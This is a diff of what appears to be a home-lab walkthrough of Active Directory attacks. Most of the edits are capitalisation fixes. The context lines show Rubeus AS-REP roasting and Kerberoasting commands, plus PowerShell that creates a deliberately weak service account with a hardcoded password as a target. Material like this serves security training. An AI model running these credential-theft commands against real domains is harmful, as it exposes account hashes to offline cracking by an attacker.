@@ -181,7 +181,7 @@ Activate
 
 ![image](https://user-images.githubusercontent.com/13157446/129409430-5b5cc59e-5ed3-4370-b8bf-f1fe1a00ef98.png)
 
-Run rubeus
+Run Rubeus
 
 	PS C:\Users\thor\Desktop> .\Rubeus.exe asreproast
 
@@ -222,12 +222,12 @@ Crack it
 
 ## Kerberoasting
 
-create OU for service accounts
+Create OU for service accounts
 
 ![image](https://user-images.githubusercontent.com/13157446/129405912-68180d26-1ab2-447f-9e59-4d8f123ffec9.png)
 
 
-create service account
+Create service account
 
 	#requires -module ActiveDirectory
 
@@ -236,12 +236,12 @@ create service account
 	$psw = convertto-securestring "Pass123!" -asplaintext -force
 	New-ADUser -Path $destou -Name "kerberoastme"  -AccountPassword $psw -Enabled $true -AllowReversiblePasswordEncryption $false -CannotChangePassword $true -PasswordNeverExpires $true
 
-set SPN for service account
+Set SPN for service account
 
 ![Pasted image 20210813214029](https://user-images.githubusercontent.com/13157446/129405121-db8df286-38e3-4d16-a601-3bde3cf1da20.png)
 
 
-enum SPN users
+Enum SPN users with Rubeus
 
 
 	PS C:\Users\thor\Desktop> .\Rubeus.exe kerberoast
